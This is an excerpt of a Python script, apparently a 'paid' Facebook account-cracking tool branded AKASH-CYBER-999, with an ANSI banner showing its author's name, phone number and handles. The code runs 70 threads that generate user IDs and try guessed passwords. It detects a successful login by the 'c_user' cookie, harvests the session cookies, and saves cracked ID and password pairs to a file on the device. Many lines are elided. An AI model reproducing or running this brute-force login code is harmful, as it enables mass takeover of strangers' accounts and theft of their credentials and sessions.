...
\033[32;1m╔═════════════════════════════════════════════╗
\033[32;1m║
\033[32;1m║\033[32;1m    ___     __ __  ___    _____  __  __
\033[32;1m║\033[32;1m   /   |   / //_/ /   |  / ___/ / / / /
\033[32;1m║\033[32;1m  / /| |  / ,<   / /| |  \__ \ / /_/ / 
\033[32;1m║\033[32;1m / ___ | / /| | / ___ | ___/ // __  /  
\033[32;1m║\033[32;1m/_/  |_|/_/ |_|/_/  |_|/____//_/ /_/                                        
\033[32;1m╚═════════════════════════════════════════════╝
\x1b[38;5;196m╔═════════════╗  ࿇⃝🌹A🌹⃝࿇  \033[38;5;46m╔══════════════════╗
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢K🌹⃝࿇  \033[38;5;46m║\033[38;5;46mAKASH             ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m║\033[38;5;46mAKASH AHMED      ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢S🌹⃝࿇  \033[38;5;46m║\033[38;5;46m+8801971214358     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢H🌹⃝࿇  \033[38;5;46m║\033[38;5;46mAKASH-CYBER-999║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢𝐊⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m+8801971214358     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐈𝐌𝐎      ║  ࿇⃝🌹⃢𝐈⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m+8801971214358     ║
...
def xxr():
    ...
    with ThreadPool(max_workers=70) as manshera:
        ...
        print(f'{x} \033[1;91m[\033[1;97m🥰\033[1;91m]\033[0;31m HELLO I AM AKASH')
        print(f' \033[1;91m[\033[1;97m🥰\033[1;91m]\033[0;31m ENJOY PAID \033[1;97m: \033[0;31m AKASH-CYBER-999')
        print(f' \033[1;91m[\033[1;97m🥰\033[1;91m]\033[0;31m 𝙏𝙊𝙊𝙇 OWNER AKASH \033[1;97m: \033[0;31m AKASH-CYBER-999')
        print(f' \033[1;91m[\033[1;97m🥰\033[1;91m]\033[0;31m 𝐅𝐔𝐂𝐊 𝐁𝐘 AKASH ')
        print(f" \033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\x1b[38;5;196m [SORRY-💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AKASH-999.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;48mAKASH💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()